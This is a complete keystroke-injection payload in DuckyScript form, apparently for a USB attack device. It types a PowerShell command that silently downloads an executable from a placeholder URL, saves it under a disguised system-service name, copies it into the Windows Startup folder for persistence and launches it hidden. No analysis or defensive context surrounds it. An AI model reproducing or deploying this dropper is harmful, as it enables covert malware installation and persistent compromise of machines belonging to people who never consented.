DELAY 1000
STRING powershell.exe "$url=\"<url_exe_da_iniettare>\";$out=\"$env:APPDATA\win_sys_service.exe\";$startup=\"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\win_sys_service.exe\";$ProgressPreference=\"SilentlyContinue\";(New-Object System.Net.WebClient).DownloadFile($url,$out);if(Test-Path $out){if(-not(Test-Path $startup)){Copy-Item $out $startup -Force};Start-Process $out -WindowStyle Hidden}"&&exit
